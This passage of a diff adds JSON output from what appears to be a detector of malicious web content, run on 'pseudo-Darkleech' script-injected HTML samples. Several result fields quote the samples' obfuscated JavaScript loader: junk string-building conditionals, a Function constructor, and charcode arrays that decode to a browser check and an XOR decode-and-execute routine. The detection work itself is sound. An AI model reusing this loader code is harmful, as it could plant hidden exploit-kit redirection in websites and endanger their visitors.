f+=(725934932>430282467?\"\\x20\":\"\\x66\");\nysgsteikzf+=(935319660<2055462526?\"\\x67\\x6d\\x68\":\"\\x72\");\nysgsteikzf+=(167653770>938128632?\"\\x6d\":\"\\x79\");\nysgsteikzf+=(1804992437<1919718269?\"ovx\":\"p\");\nysgsteikzf+=(752010143>1981692069?\"\\x72\":\"b\");\nysgsteikzf+=(665991785>548785359?\"\\x78\\x78\\x71\":\"\\x69\\x73\");\nysgsteikzf+=(1470464639>1679791851?\"\\x74\\x62\":\"\\x6a\");\nysgsteikzf+=(1046557338>1970605692?\"\\x78\":\"\\x79\");\nysgsteikzf+=(1183506624<930845979?\"\\x76\\x74\":\"\\x28\\x68\\x6a\\x7a\");\nysgsteikzf+=(1987925864<2095948785?\"m\":\"\\x66\\x72\");\nysgsteikzf+=(201147270<184837318?\"ok\":\"in\");\nysgsteikzf+=(378077011>52988665?\"\\x65\\x69\":\"\\x68\\x66\");\nysgsteikzf+=(1895371471>1963944648?\"\\x7a\\x6b\\x62\":\"s\");\nysgsteikzf+=(274980554<698214371?\"\\x7a\\x6b\\x70\":\"\\x69\\x73\");\nysgsteikzf+=(1583733879>536797112?\"\\x77\":\"le\");\nysgsteikzf+=(1768419363>2087728785?\"gqx\":\"r,limmocwdl\");\nysgsteikzf+=(721465008<1833000686?\"qk\":\"u\");\nysgsteikzf+=(58684444<1634669692?\"\\x78\":\"\\x61\\x65\");\nysgsteikzf+=(1159985320>2036569320?\"idv\":\"jqwb\");\nysgsteikzf+=(76084537<419946509?\",m\":\"bc\");\nysgsteikzf+=(194125458>127354681?\"\\x73\":\"g\");\nysgsteikzf+=(643774078>976027427?\"\\x79\\x6d\":\"\\x74\");\nysgsteikzf+=(1110514684>449257652?\"\\x6e\\x72\\x6d\":\"\\x69\");\nysgsteikzf+=(750816362<809114067?\"p\":\"\\x76\\x7a\");\nysgsteikzf+=(650059415>139768678?\"\\x66\\x66\":\"\\x7a\\x78\\x79\");\nysgsteikzf+=(2046847430>229411163?\"\\x72\\x74\\x72\\x29\\x7b\\x72\":\"\\x79\\x78\");\nysgsteikzf+=(23543481<1687899744?\"e\":\"\\x74\");\nysgsteikzf+=(298143202>355808929?\"\\x6c\\x6e\\x69\":\"\\x74\\x75\");\nysgsteikzf+=(1662585753<557936216?\"\\x70\":\"\\x72\");\nysgsteikzf+=(1936065580<643613603?\"\\x77\\x66\":\"n new\");\nysgsteikzf+=(1748229447>2147184080?\"wca\":\" \");\nysgsteikzf+=(1737901617>1617484605?\"\\x46\\x75\\x6e\":\"nf\");\nysgsteikzf+=(77741327>629562023?\"\\x67\\x79\":\"c\");\nysgsteikzf+=(759318063>461268043?\"\\x74\":\"c\");\nysgsteikzf+=(1331389757>1583092035?\"w\":\"\\x69\\x6f\");\nysgsteikzf+=(701065543<2027072074?\"n(h\":\"pc\");\nysgsteikzf+=(2094092518<539255014?\"jz\":\"\\x6a\");\nysgsteikzf+=(848781087<1931763402?\"zmin\":\"gt\");\nysgsteikzf+=(629837325<800899808?\"\\x65\\x69\\x73\":\"\\x77\");\nysgsteikzf+=(1679068878>1001144627?\"zkp\":\"\\x6c\\x74\\x76\");\nysgsteikzf+=(1610707447<1886086789?\"\\x77\":\"gxy\");\nysgsteikzf+=(193125028<1830030381?\"\\x72\":\"\\x76\");\nysgsteikzf+=(1158991428>693130575?\",\":\"hos\");\nysgsteikzf+=(1683776837<632806640?\"d\":\"\\x6c\");\nysgsteikzf+=(111321351>81772241?\"\\x69\\x6d\\x6d\\x6f\":\"\\x61\");\nysgsteikzf+=(618441092<88467402?\"\\x6e\\x71\":\"\\x63\\x77\");\nysgsteikzf+=(1533014098>813404409?\"\\x64\\x6c\\x71\":\"zw\");\nysgsteikzf+=(474983411<1860078082?\"k\":\"\\x7a\\x77\\x6b\");\nysgsteikzf+=(1149188598<264432907?\"jld\":\"\\x78\\x6a\");\nysgsteikzf+=(398708407<2045443381?\"q\":\"u\");\nysgsteikzf+=(1846709724<2103303408?\"w\":\"ohr\");\nysgsteikzf+=(427228382<2066810533?\"b\":\"\\x7a\\x69\");\nysgsteikzf+=(1204542590<449342862?\"ei\":\"\\x2c\");\nysgsteikzf+=(825889632<672805593?\"lcz\":\"mst\");\nysgsteikzf+=(1460122749<288895556?\"\\x70\":\"\\x6e\\x72\\x6d\\x70\\x66\\x66\\x72\");\nysgsteikzf+=(1418680128>306227647?\"t\":\"\\x72\");\nysgsteikzf+=(428214960<1491723949?\"\\x72\\x29\":\"qi\");\nysgsteikzf+=(1338823185<1531842375?\"\\x7d\":\"\\x66\\x69\\x6c\");\nvar jrsmqrakquj=0;\nvar tccyfrhhcgj=true;\nvar azirymorjhric=\"\\x22\";\nvar axyonmxbgijxv=8;"
+                    ],
+                    [
+                        "script",
+                        "var qrsfabnzxfmsfl=gmhyovxbxxqjy(hjzmineiszkpwr,limmocwdlqkxjqwb,msnhahtbzsvg+ecczddvltdjh+hjzmineiszkpwr+ekhyahinlimoriqw+nbxlknardklr+nxhdktluzm+guwugkgecseizc+ypspcxsont+limmocwdlqkxjqwb+izahxodjqhgsrdz);\nvar ohkhdfxkqjokynb=gbqhddsztmjinz(hjzmineiszkpwr,msnhahtbzsvg+ecczddvltdjh+abnzghwtkmaok+ypspcxsont+hjzmineiszkpwr+izahxodjqhgsrdz+ekhyahinlimoriqw+ibhcdituyg);\nvar vpnpdhpnzeuvo=new Function(hjzmineiszkpwr,limmocwdlqkxjqwb,msnhahtbzsvg+ecczddvltdjh+hjzmineiszkpwr+uijznmbmue+limmocwdlqkxjqwb);\nvar kgmyjzrudwrtz=gbqhddsztmjinz(limmocwdlqkxjqwb,msnhahtbzsvg+ecczddvltdjh+pxswqeuteekutz+ekhyahinlimoriqw+zzxwycgbidngtd+kyxnwmpqialoz+nxhdktluzm+ypspcxsont+limmocwdlqkxjqwb+izahxodjqhgsrdz);\nvar swnzrsxwhxkp=gbqhddsztmjinz(hjzmineiszkpwr,msnhahtbzsvg+ecczddvltdjh+hjzmineiszkpwr+ekhyahinlimoriqw+rmjbcsxejqg);\nvar gypzwngznon=gmhyovxbxxqjy(hjzmineiszkpwr,limmocwdlqkxjqwb,msnhahtbzsvg+ecczddvltdjh+hjzmineiszkpwr+ekhyahinlimoriqw+eksgejxyddz+phufwsysgjfch+uevgwaxwlc+ypspcxsont+limmocwdlqkxjqwb+izahxodjqhgsrdz);\nvar itqspczmorhqvrb=gmhyovxbxxqjy(hjzmineiszkpwr,limmocwdlqkxjqwb,msnhahtbzsvg+ecczddvltdjh+hjzmineiszkpwr+xrwwvqvxil+limmocwdlqkxjqwb);\nvar fskkjvetyxyfxjesn=gmhyovxbxxqjy(hjzmineiszkpwr,limmocwdlqkxjqwb,msnhahtbzsvg+ecczddvltdjh+hjzmineiszkpwr+unvcpmkzgypy+limmocwdlqkxjqwb);\nvar swnzrsxwhxkp=gbqhddsztmjinz(hjzmineiszkpwr,msnhahtbzsvg+ecczddvltdjh+hjzmineiszkpwr+ekhyahinlimoriqw+rmjbcsxejqg);\nvar ltddlkjdotau=gmhyovxbxxqjy(hjzmineiszkpwr,limmocwdlqkxjqwb,msnhahtbzsvg+ecczddvltdjh+hjzmineiszkpwr+wzuezmfcey+limmocwdlqkxjqwb);"
+                    ],
+                    [
+                        "script",
+                        "var gasynepagsxebh=gmhyovxbxxqjy(hjzmineiszkpwr,limmocwdlqkxjqwb,msnhahtbzsvg+ecczddvltdjh+hjzmineiszkpwr+iufpfnmcgcevs+limmocwdlqkxjqwb);\nvar swvaineqskgf=jrsmqrakquj;\nvar tsucbyaktm=axyonmxbgijxv;\nvar mnyawhfckcds=ohkhdfxkqjokynb(hjzmineiszkpwr);\nvar axvveletnoryxyu=gmhyovxbxxqjy(hjzmineiszkpwr,limmocwdlqkxjqwb,msnhahtbzsvg+ecczddvltdjh+hjzmineiszkpwr+bfupsonwrlc+bfupsonwrlc+limmocwdlqkxjqwb);\nvar iwrrxwyxdaybxd=gmhyovxbxxqjy(hjzmineiszkpwr,limmocwdlqkxjqwb,msnhahtbzsvg+ecczddvltdjh+hjzmineiszkpwr+iufpfnmcgcevs+hcvetcrqyjtpfult+limmocwdlqkxjqwb);\nvar hhybzdtwfxqx=jrsmqrakquj;\nvar powbtabxgwaqwi=\"\";\nvar vbwaulentzlchir=gbqhddsztmjinz(hjzmineiszkpwr,gbgauqiemqtunjq+lfqwuinyuf+gbgauqiemqtunjq+azirymorjhric+duyryvlrkaiup+azirymorjhric+lfqwuinyuf+gbgauqiemqtunjq+azirymorjhric+duyryvlrkaiup+azirymorjhric+lfqwuinyuf+ypspcxsont+hjzmineiszkpwr+izahxodjqhgsrdz+ypspcxsont+izahxodjqhgsrdz);\nvar dergnwesvbrjdvvc;\nvar acmchrigsuxvt=ohkhdfxkqjokynb(limmocwdlqkxjqwb);\nvar lwynrjcmfch=gmhyovxbxxqjy(hjzmineiszkpwr,limmocwdlqkxjqwb,msnhahtbzsvg+ecczddvltdjh+hjzmineiszkpwr+xdjuhpkntpypyb+limmocwdlqkxjqwb);\nvar jptrilqglcnj=gbqhddsztmjinz(hjzmineiszkpwr,msnhahtbzsvg+ecczddvltdjh+vujcgqrtvmep+hjzmineiszkpwr);"
+                    ],
+                    [
+                        "script",
+                        "var nvpnkkkhpksvu=[ozvmcudhtd+kzuctkepdzsux+qzsrhphtrigo(bxsmgythlkn,jrsmqrakquj)+qzsrhphtrigo(bxsmgythlkn,jrsmqrakquj),qzsrhphtrigo(dvfbwqagxafxd,jrsmqrakquj)+qzsrhphtrigo(fwfrswntwnjlo,axyonmxbgijxv)+qzsrhphtrigo(bckznviwkncv,axyonmxbgijxv)+qzsrhphtrigo(yzdwyblnkba,jrsmqrakquj),];\nmzkcexxkjqyvcbh=jrsmqrakquj;\nwhile (gasynepagsxebh(mzkcexxkjqyvcbh,swnzrsxwhxkp(nvpnkkkhpksvu)))\n{\n    vbwaulentzlchir(\"vjibsrydbwc\"+hcvetcrqyjtpfult+qzsrhphtrigo(eksgejxyddz,axyonmxbgijxv)+qzsrhphtrigo(jwtckkvepcf,axyonmxbgijxv)+jbxpthctxpvfoq+qzsrhphtrigo(xrdxkonzwsuf,jrsmqrakquj)+qzsrhphtrigo(jwtckkvepcf,axyonmxbgijxv)+qzsrhphtrigo(faekktuxwyfzj,axyonmxbgijxv)+qzsrhphtrigo(jhdlojbywgl,axyonmxbgijxv)+qzsrhphtrigo(blntxnlnsexo,axyonmxbgijxv)+ekhyahinlimoriqw+qzsrhphtrigo(ryyewdpvnss,jrsmqrakquj)+qzsrhphtrigo(nrqehvyoqvsbyf,jrsmqrakquj)+qzsrhphtrigo(waeneonfmmkv,jrsmqrakquj)+qzsrhphtrigo(blntxnlnsexo,axyonmxbgijxv)+qzsrhphtrigo(fwfrswntwnjlo,jrsmqrakquj)+qzsrhphtrigo(xrdxkonzwsuf,jrsmqrakquj)+qzsrhphtrigo(faekktuxwyfzj,jrsmqrakquj)+qzsrhphtrigo(eksgejxyddz,axyonmxbgijxv)+qzsrhphtrigo(faekktuxwyfzj,axyonmxbgijxv));\n    if (gasynepagsxebh((+[window.sidebar]),gypzwngznon(vjibsrydbwc,nvpnkkkhpksvu[mzkcexxkjqyvcbh])))\n    {\n        tsucbyaktm=vpnpdhpnzeuvo(swnzrsxwhxkp(nvpnkkkhpksvu), mzkcexxkjqyvcbh);\n        break;\n    }\n    mzkcexxkjqyvcbh++;\n}"
+                    ]
+                ]
+            },
+            "2016-02-05 pseudo-Darkleech Script_injected.html": {
+                "count": 0,
+                "time": 0.0009970664978027344,
+                "additional_info": []
+            },
+            "2016-02-24 pseudo-Darkleech Script_injected.html": {
+                "count": 1,
+                "time": 0.0,
+                "additional_info": [
+                    [
+                        "div",
+                        "101,105,110,102,120,109,101,98,113,97,61,40,43,91,119,105,110,100,111,119,46,115,105,100,101,98,97,114,93,41,59,120,119,120,117,111,117,102,121,104,120,109,108,61,91,34,114,118,58,49,49,34,44,34,77,83,73,69,34,44,93,59,102,111,114,40,98,110,104,107,120,119,121,101,113,117,109,61,101,105,110,102,120,109,101,98,113,97,59,98,110,104,107,120,119,121,101,113,117,109,60,120,119,120,117,111,117,102,121,104,120,109,108,46,108,101,110,103,116,104,59,98,110,104,107,120,119,121,101,113,117,109,43,43,41,123,105,102,40,110,97,118,105,103,97,116,111,114,46,117,115,101,114,65,103,101,110,116,46,105,110,100,101,120,79,102,40,120,119,120,117,111,117,102,121,104,120,109,108,91,98,110,104,107,120,119,121,101,113,117,109,93,41,62,101,105,110,102,120,109,101,98,113,97,41,123,116,115,109,119,98,112,101,112,113,113,119,97,103,97,61,120,119,120,117,111,117,102,121,104,120,109,108,46,108,101,110,103,116,104,45,98,110,104,107,120,119,121,101,113,117,109,59,98,114,101,97,107,59,125,125,105,102,40,110,97,118,105,103,97,116,111,114,46,117,115,101,114,65,103,101,110,116,46,105,110,100,101,120,79,102,40,34,77,83,73,69,49,48,34,41,62,101,105,110,102,120,109,101,98,113,97,41,123,116,115,109,119,98,112,101,112,113,113,119,97,103,97,43,43,59,125,99,118,119,102,103,101,99,110,113,105,121,113,61,116,115,109,119,98,112,101,112,113,113,119,97,103,97,45,49,59,111,108,108,102,112,121,103,114,107,114,110,61,34,82,55,66,115,118,80,70,111,81,78,68,34,59,115,115,109,122,121,109,118,100,118,118,118,106,97,106,61,100,111,99,117,109,101,110,116,46,103,101,116,69,108,101,109,101,110,116,66,121,73,100,40,34,110,108,119,115,109,98,105,106,120,98,34,41,46,105,110,110,101,114,72,84,77,76,59,101,97,116,111,116,107,102,97,106,113,102,98,116,98,103,115,61,101,105,110,102,120,109,101,98,113,97,59,107,97,97,108,101,114,99,121,120,101,61,101,105,110,102,120,109,101,98,113,97,59,113,111,121,116,97,112,111,107,105,103,118,98,61,34,34,59,102,111,114,40,98,110,104,107,120,119,121,101,113,117,109,61,101,105,110,102,120,109,101,98,113,97,59,98,110,104,107,120,119,121,101,113,117,109,60,115,115,109,122,121,109,118,100,118,118,118,106,97,106,46,108,101,110,103,116,104,59,98,110,104,107,120,119,121,101,113,117,109,43,61,99,118,119,102,103,101,99,110,113,105,121,113,41,123,119,113,103,115,114,106,113,114,98,98,112,122,61,115,115,109,122,121,109,118,100,118,118,118,106,97,106,46,99,104,97,114,67,111,100,101,65,116,40,98,110,104,107,120,119,121,101,113,117,109,41,59,105,102,40,119,113,103,115,114,106,113,114,98,98,112,122,62,61,57,55,38,38,119,113,103,115,114,106,113,114,98,98,112,122,60,61,49,50,50,41,123,105,102,40,101,97,116,111,116,107,102,97,106,113,102,98,116,98,103,115,37,116,115,109,119,98,112,101,112,113,113,119,97,103,97,41,123,113,111,121,116,97,112,111,107,105,103,118,98,43,61,83,116,114,105,110,103,46,102,114,111,109,67,104,97,114,67,111,100,101,40,40,40,97,105,116,111,122,121,107,105,116,101,103,43,119,113,103,115,114,106,113,114,98,98,112,122,45,57,55,41,94,111,108,108,102,112,121,103,114,107,114,110,46,99,104,97,114,67,111,100,101,65,116,40,107,97,97,108,101,114,99,121,120,101,37,111,108,108,102,112,121,103,114,107,114,110,46,108,101,110,103,116,104,41,41,37,50,53,53,41,59,107,97,97,108,101,114,99,121,120,101,43,43,59,125,101,108,115,101,123,97,105,116,111,122,121,107,105,116,101,103,61,40,119,113,103,115,114,106,113,114,98,98,112,122,45,57,55,41,42,50,54,59,125,101,97,116,111,116,107,102,97,106,113,102,98,116,98,103,115,43,43,59,125,125,91,93,91,34,99,111,110,115,116,114,117,99,116,111,114,34,93,91,34,99,111,110,115,116,114,117,99,116,111,114,34,93,40,113,111,121,116,97,112,111,107,105,103,118,98,41,40,41,59"
+                    ]
+                ]
+            },
+            "2016-03-07 pseudo-Darkleech Script_injected.html": {
+                "count": 1,
+                "time": 0.0009694099426269531,
+                "additional_info": [
+                    [
+                        "div",
+                        "100*104*111*107*61*40*43*91*119*105*110*100*111*119*46*115*105*100*101*98*97*114*93*41*59*113*104*102*105*97*116*61*91*34*114*118*58*49*49*34*44*34*77*83*73*69*34*44*93*59*102*111*114*40*120*110*116*103*115*112*105*61*100*104*111*107*59*120*110*116*103*115*112*105*60*113*104*102*105*97*116*46*108*101*110*103*116*104*59*120*110*116*103*115*112*105*43*43*41*123*105*102*40*110*97*118*105*103*97*116*111*114*46*117*115*101*114*65*103*101*110*116*46*105*110*100*101*120*79*102*40*113*104*102*105*97*116*91*120*110*116*103*115*112*105*93*41*62*100*104*111*107*41*123*99*108*122*103*118*61*113*104*102*105*97*116*46*108*101*110*103*116*104*45*120*110*116*103*115*112*105*59*98*114*101*97*107*59*125*125*105*102*40*110*97*118*105*103*97*116*111*114*46*117*115*101*114*65*103*101*110*116*46*105*110*100*101*120*79*102*40*34*77*83*73*69*49*48*34*41*62*100*104*111*107*41*123*99*108*122*103*118*43*43*59*125*120*100*101*114*108*61*99*108*122*103*118*45*49*59*102*115*120*61*34*79*121*120*102*98*89*49*111*109*67*107*69*34*59*99*115*61*100*111*99*117*109*101*110*116*46*103*101*116*69*108*101*109*101*110*116*66*121*73*100*40*34*98*112*105*120*113*34*41*46*105*110*110*101*114*72*84*77*76*59*114*102*113*121*61*100*104*111*107*59*99*107*110*108*61*100*104*111*107*59*105*121*97*108*103*108*61*34*34*59*102*111*114*40*120*110*116*103*115*112*105*61*100*104*111*107*59*120*110*116*103*115*112*105*60*99*115*46*108*101*110*103*116*104*59*120*110*116*103*115*112*105*43*61*120*100*101*114*108*41*123*101*115*108*113*61*99*115*46*99*104*97*114*67*111*100*101*65*116*40*120*110*116*103*115*112*105*41*59*105*102*40*101*115*108*113*62*61*57*55*38*38*101*115*108*113*60*61*49*50*50*41*123*105*102*40*114*102*113*121*37*99*108*122*103*118*41*123*105*121*97*108*103*108*43*61*83*116*114*105*110*103*46*102*114*111*109*67*104*97*114*67*111*100*101*40*40*40*117*97*109*119*122*110*43*101*115*108*113*45*57*55*41*94*102*115*120*46*99*104*97*114*67*111*100*101*65*116*40*99*107*110*108*37*102*115*120*46*108*101*110*103*116*104*41*41*37*50*53*53*41*59*99*107*110*108*43*43*59*125*101*108*115*101*123*117*97*109*119*122*110*61*40*101*115*108*113*45*57*55*41*42*50*54*59*125*114*102*113*121*43*43*59*125*125*91*93*91*34*99*111*110*115*116*114*117*99*116*111*114*34*93*91*34*99*111*110*115*116*114*117*99*116*111*114*34*93*40*105*121*97*108*103*108*41*40*41*59"
+                    ]
+                ]
+            },
+            "2016-03-14 pseudo-Darkleech Script_injected.html": {
+                "count": 0,
+                "time": 0.0,
+                "additional_info": []
+            }
+        },
+        "SuspiciousObjectsHTML": {
+            "2015-10-13 pseudo-Darkleech Script_injected.html": {
+                "count": 0,
+                "time": 0.0009958744049072266,
+                "additional_info": []
+            },
+            "2015-12-16 pseudo-Darkleech Script_injected.html": {
+                "count": 0,
+                "time": 0.0,
+                "additional_info": []
+            },
+            "2016-02-05 pseudo-Darkleech Script_injected.html": {
+                "count": 0,
+                "time": 0.000997304916381836,
+                "additional_info": []
+            },
+            "2016-02-24 pseudo-Darkleech Script_injected.html": {
+                "count": 0,
+                "time": 0.0,
+                "additional_info": []
+            },
+            "2016-03-07 pseudo-Darkleech Script_injected.html": {
+                "count": 0,
+                "time": 0.0,
+                "additional_info": []
+            },
+            "2016-03-14 pseudo-Darkleech Script_injected.html": {
+                "count": 0,
+                "time": 0.0009980201721191406,
+                "additional_info": []
+            }
+        },
+        "UnknownTagsHTML": {
+            "2015-10-13 pseudo-Darkleech Script_injected.html": {
+                "count": 0.0,
+                "time": 0.0009958744049072266,
+                "additional_info": {}
+            },
+            "2015-12-16 pseudo-Darkleech Script_injected.html": {
+                "count": 0.0,
+                "time": 0.0009980201721191406,
+                "additional_info": {}
+            },
+            "2016-02-05 pseudo-Darkleech Script_injected.html": {
+                "count": 0.0,
+                "time": 0.0,
+                "additional_info": {}
+            },
+            "2016-02-24 pseudo-Darkleech Script_injected.html": {
+                "count": 0.0,
+                "time": 0.0,
+                "additional_info": {}
+            },
+            "2016-03-07 pseudo-Darkleech Script_injected.html": {
+                "count": 0.0,
+                "time": 0.0009682178497314453,
+                "additional_info": {}
+            },
+            "2016-03-14 pseudo-Darkleech Script_injected.html": {
+                "count": 0.0,
+                "time": 0.0,
+                "additional_info": {}
+            }
+        },
+        "WordCountHTML": {
+            "2015-10-13 pseudo-Darkleech Script_injected.html": {
+                "count": 111,
+                "time": 0.0020275115966796875,
+                "additional_info": {}
+            },
+            "2015-12-16 pseudo-Darkleech Script_injected.html": {
+                "count": 2165,
+                "time": 0.002959728240966797,
+                "additional_info": {}
+            },
+            "2016-02-05 pseudo-Darkleech Script_injected.html": {
+                "count": 1098,
+                "time": 0.0009970664978027344,
+                "additional_info": {}
+            },
+            "2016-02-24 pseudo-Darkleech Script_injected.html": {
+                "count": 1207,
+                "time": 0.0009968280792236328,
+                "additional_info": {}
+            },
+            "2016-03-07 pseudo-Darkleech Script_injected.html": {
+                "count": 861,
+                "time": 0.0009982585906982422,
+                "additional_info": {}
+            },
+            "2016-03-14 pseudo-Darkleech Script_injected.html": {
+                "count": 724,
+                "time": 0.000997304916381836,
+                "additional_info": {}
+            }
+        }
+    },
+    "css": {
+        "AbnormalAttributeCSS": {},
+        "BlendModeCSS": {},
+        "ComplexSelectorCSS": {},
+        "FilterCSS": {},
+        "FontUnusedCSS": {},
+        "PerformanceDegradationCSS": {},
+        "WordCountCSS": {},
+        "ZIndexCSS": {}
+    },
+    "js": {
+        "DocPropertiesJS": {},
+        "DocWriteJS": {},
+        "FormMethodJS": {},
+        "GetComputedStyleJS": {},
+        "GlobalFuncJS": {},
+        "HTML_5_EventsJS": {},
+        "JQueryJS": {},
+        "LocationJS": {},
+        "VBScriptJS": {},
+        "ActiveXJS": {},
+        "DomIdentityKeywordJS": {},
+        "DynamicCSSJS": {},
+        "TokenCountJS": {},
+        "WordCountJS": {},
+        "ContentEntropyJS": {},
+        "DeobfuscationFuncJS": {},
+        "DirectStrAssignJS": {},
+        "DomModifyJS": {},
+        "EvalJS": {},
+        "EventAttachmentJS": {},
+        "IframeJS": {},
+        "KeywordRatioJS": {},
+        "LongStringJS": {},
+        "SetTimeoutIntervalJS": {},
+        "ShellcodeJS": {},
+        "StringEntropyJS": {},
+        "SuspiciousStringJS": {},
+        "SuspiciousTagJS": {}
+    },
+    "url": {
+        "IPURL": {},
+        "SubDomainURL": {},
+        "SuspiciousPatternURL": {}
+    },
+    "har": {}
+}
